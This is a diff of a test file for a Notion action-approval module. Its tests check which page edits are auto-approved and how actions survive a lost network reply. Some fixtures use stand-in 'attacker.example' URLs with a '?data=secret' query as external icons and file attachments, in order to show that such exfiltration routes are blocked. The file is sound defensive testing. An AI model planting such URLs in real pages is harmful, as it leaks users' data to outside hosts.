@@ -1,5 +1,13 @@
 import { describe, expect, it } from "vitest";
-import { describeAction, findWorkspaceParentPage, type NotionStore } from "../src/notion-actions";
+import {
+  AUTO_APPROVABLE_KINDS,
+  applyStoredAction,
+  describeAction,
+  findWorkspaceParentPage,
+  NotionStore,
+  stageAction,
+  type NotionAction,
+} from "../src/notion-actions";
 
 const databaseRow = (titlePropertyName?: string) => describeAction({
   type: "createPage",
@@ -97,6 +105,72 @@ describe("describeAction", () => {
   });
 });
 
+describe("auto-approval", () => {
+  const icon = { emoji: "📝" };
+  const externalIcon = { imageUrl: "https://attacker.example/icon.png?data=secret" };
+  const verdicts: [NotionAction, string, boolean][] = [
+    [{ type: "appendContent", pageId: "page-1", markdown: "Hello" }, "append-content", true],
+    [{ type: "setTitle", pageId: "page-1", title: "New", previousTitle: "Old" }, "edit-pages", true],
+    [{
+      type: "setProperties", pageId: "page-1",
+      properties: { Done: { type: "checkbox", checked: true } },
+      previousProperties: { Done: { type: "checkbox", checked: false } },
+    }, "edit-pages", true],
+    [{ type: "setIcon", pageId: "page-1", icon, previousIcon: null }, "edit-pages", true],
+    [{ type: "setIcon", pageId: "page-1", icon: null, previousIcon: icon }, "edit-pages", true],
+    // Notion loads an external icon's URL whenever the page is shown, so the URL could carry data out.
+    [{ type: "setIcon", pageId: "page-1", icon: externalIcon, previousIcon: icon }, "edit-pages", false],
+    [{ type: "createPage", provisionalId: "~1", parent: { kind: "page", pageId: "page-1" } }, "create-pages", true],
+    [{ type: "createPage", provisionalId: "~1", parent: { kind: "database", databaseId: "db-1" } }, "create-pages", true],
+    [{
+      type: "createPage", provisionalId: "~1", parent: { kind: "workspace", pageId: "page-1", title: "Home" },
+    }, "create-pages", true],
+    [{ type: "createPage", provisionalId: "~1", parent: { kind: "workspace" } }, "create-pages", true],
+    [{ type: "createPage", provisionalId: "~1", parent: { kind: "page", pageId: "page-1" }, icon }, "create-pages", true],
+    [{
+      type: "createPage", provisionalId: "~1", parent: { kind: "page", pageId: "page-1" }, icon: externalIcon,
+    }, "create-pages", false],
+    // A files property holds external URLs that Notion loads in card previews, so it could carry data out too.
+    [{
+      type: "setProperties", pageId: "page-1",
+      properties: { Attachments: { type: "files", files: [{ name: "p.png", url: "https://attacker.example/p.png?data=secret" }] } },
+      previousProperties: { Attachments: { type: "files", files: [] } },
+    }, "edit-pages", false],
+    [{
+      type: "setProperties", pageId: "page-1",
+      properties: { Attachments: { type: "files", files: [] } },
+      previousProperties: { Attachments: { type: "files", files: [{ name: "p.png", url: "https://example.com/p.png" }] } },
+    }, "edit-pages", true],
+    [{
+      type: "createPage", provisionalId: "~1", parent: { kind: "database", databaseId: "db-1" },
+      properties: { Attachments: { type: "files", files: [{ name: "p.png", url: "https://attacker.example/p.png?data=secret" }] } },
+    }, "create-pages", false],
+    [{ type: "restore", pageId: "page-1" }, "restore-pages", true],
+    [{ type: "addComment", pageId: "page-1", text: "Hi" }, "post-comments", true],
+    [{ type: "archive", pageId: "page-1" }, "trash-pages", false],
+  ];
+
+  it.each(verdicts)("gives %j the kind %s and verdict %s", (action, tag, autoApprovable) => {
+    const description = describeAction(action);
+    expect(description.actionKind?.tag).toBe(tag);
+    expect(description.autoApprovable).toBe(autoApprovable);
+  });
+
+  it("never auto-approves moving a page to trash, which has a kind of its own", () => {
+    const trash = describeAction({ type: "archive", pageId: "page-1" });
+    expect(trash.autoApprovable).toBe(false);
+    expect(AUTO_APPROVABLE_KINDS.map(kind => kind.tag)).not.toContain(trash.actionKind?.tag);
+  });
+
+  it("reports exactly the kinds of the auto-approvable actions, once each, with one label per tag", () => {
+    const approvable = verdicts.filter(([, , verdict]) => verdict).map(([action]) => describeAction(action).actionKind);
+    const byTag = new Map(approvable.map(kind => [kind?.tag, kind?.label]));
+    expect(AUTO_APPROVABLE_KINDS.map(kind => kind.tag).toSorted()).toEqual([...byTag.keys()].toSorted());
+    for (const kind of AUTO_APPROVABLE_KINDS) expect(kind.label).toBe(byTag.get(kind.tag));
+    for (const kind of approvable) expect(kind?.label).toBe(byTag.get(kind?.tag));
+  });
+});
+
 describe("findWorkspaceParentPage", () => {
   it("returns the most recently edited shared page", async () => {
     const searches: unknown[] = [];
@@ -121,5 +195,43 @@ describe("findWorkspaceParentPage", () => {
       sort: { direction: "descending", timestamp: "last_edited_time" },
       page_size: 1,
     }]);
+  });
+});
+
+describe("stageAction", () => {
+  function memoryStore(appended: string[]) {
+    const kv = new Map<string, unknown>();
+    const storage = {
+      get: (key: string) => structuredClone(kv.get(key)),
+      put: (key: string, value: unknown) => void kv.set(key, structuredClone(value)),
+      delete: (key: string) => kv.delete(key),
+      list: ({ prefix }: { prefix: string }) => [...kv].filter(([key]) => key.startsWith(prefix)),
+    };
+    const api = { appendBlockChildren: async (pageId: string) => { appended.push(pageId); return ["block-1"]; } };
+    return new NotionStore(storage as never, api as never);
+  }
+
+  it("keeps an action applied before a lost submit reply, and reports it submitted", async () => {
+    const appended: string[] = [];
+    const store = memoryStore(appended);
+    // An auto-approval applies the action before the reply, which then never arrives.
+    const queue = { submitAction: async (id: number) => {
+      await applyStoredAction(store, id);
+      throw new Error("Network connection lost.");
+    } };
+
+    const id = await stageAction(store, queue as never, { type: "appendContent", pageId: "page-1", markdown: "Hello" });
+
+    expect(appended).toEqual(["page-1"]);
+    expect(store.getAction(id)).toMatchObject({ state: "applied", appendedBlockIds: ["block-1"] });
+  });
+
+  it("drops the record and fails when the submit fails without applying", async () => {
+    const store = memoryStore([]);
+    const queue = { submitAction: async () => { throw new Error("queue gone"); } };
+
+    await expect(stageAction(store, queue as never, { type: "appendContent", pageId: "page-1", markdown: "Hello" }))
+      .rejects.toThrow("queue gone");
+    expect(store.getAction(1)).toBeUndefined();
   });
 });
